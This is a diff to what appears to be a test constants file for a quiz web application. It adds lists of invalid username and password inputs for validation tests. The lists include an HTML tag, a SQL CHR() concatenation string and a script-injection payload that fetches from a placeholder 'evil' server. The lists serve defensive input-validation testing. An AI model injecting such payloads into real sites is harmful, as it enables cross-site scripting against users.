@@ -22,3 +22,34 @@ ADD_ANSWER_BTN = "Add answer"
 ADD_QUIZ_BTN = "Create"
 ADD_QUESTION_BTN = "Create"
 START_QUIZ_BUTTON = "Start quiz"
+
+EMPTY = ""
+
+NAIVE_INVALID_INPUTS_TO_USERNAME = [
+    EMPTY,
+    ' ',
+    'y',
+    'yo',
+    'yoy',
+    'yoyo',
+    'yoyoy',
+    ' yoyoy',
+    'asdfasdfa___&',
+    '<strong>Murmeli</strong>',
+    'CHR(104)||CHR(101)||CHR(108)||CHR(108)',
+    '<script>fetch("http://myevilserver.com").then(r => r.json()).then(() => console.log("do something evil"))</script>'
+]
+
+NAIVE_INVALID_INPUTS_TO_PASSWORD = [
+    EMPTY,
+    ' ',
+    'y',
+    'yo',
+    'yoy',
+    'yoyo',
+    'yoyoy',
+    ' yoyoy',
+    '<strong>Murmeli</strong>',
+    'CHR(104)||CHR(101)||CHR(108)||CHR(108)',
+    '<script>fetch("http://myevilserver.com").then(r => r.json()).then(() => console.log("do something evil"))</script>'
+]
